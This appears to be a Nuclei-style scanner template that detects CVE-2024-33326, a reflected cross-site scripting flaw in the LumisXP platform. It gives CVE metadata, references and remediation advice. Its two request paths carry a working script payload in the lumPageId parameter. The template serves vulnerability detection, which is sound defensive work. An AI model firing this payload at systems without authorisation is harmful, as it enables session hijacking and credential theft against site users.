http:
- matchers:
  - condition: and
    dsl:
    - contains(body, "<script>confirm(document.domain)</script>")
    - contains(content_type, "text/html") && contains(set_cookie, "lum")
    - status_code == 200
    type: dsl
  method: GET
  path:
  - '{{BaseURL}}/portal/XsltResultControllerHtml.jsp?xslContent=&interfaceInstanceId=&lumPageId=<script>confirm(document.domain)</script>&xslContentFilePath='
  - '{{BaseURL}}/XsltResultControllerHtml.jsp?xslContent=&interfaceInstanceId=&lumPageId=<script>confirm(document.domain)</script>&xslContentFilePath='
  stop-at-first-match: true
id: CVE-2024-33326
info:
  author: 0xr2r
  classification:
    cpe: cpe:2.3:a:lumis:lumis_experience_platform:*:*:*:*:*:*:*:*
    cve-id: CVE-2024-33326
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N
    cvss-score: 5.4
    cwe-id: CWE-79
  description: 'A cross-site scripting (XSS) vulnerability in the XsltResultControllerHtml.jsp
    component of LumisXP v15.0.x to v16.1.x allows attackers to execute arbitrary
    web scripts or HTML via the lumPageID parameter.

    '
  impact: 'Successful exploitation allows attackers to execute arbitrary JavaScript
    in the victim''s browser, potentially leading to session hijacking, credential
    theft, or defacement.

    '
  metadata:
    max-request: 1
    product: lumis_experience_platform
    vendor: lumis
    verified: true
  name: LumisXP - Cross-site Scripting
  reference:
  - https://gist.github.com/rodnt/51ae2897abfff1bdcedccf72edbf3d24
  - https://seclists.org/fulldisclosure/2024/Jul/10
  - https://nvd.nist.gov/vuln/detail/CVE-2024-33326
  remediation: 'Apply security patches or upgrade to a version that addresses this
    XSS vulnerability. Implement proper input validation and output encoding.

    '
  severity: medium
  tags: cve,cve2024,xss,lumis,lumisxp
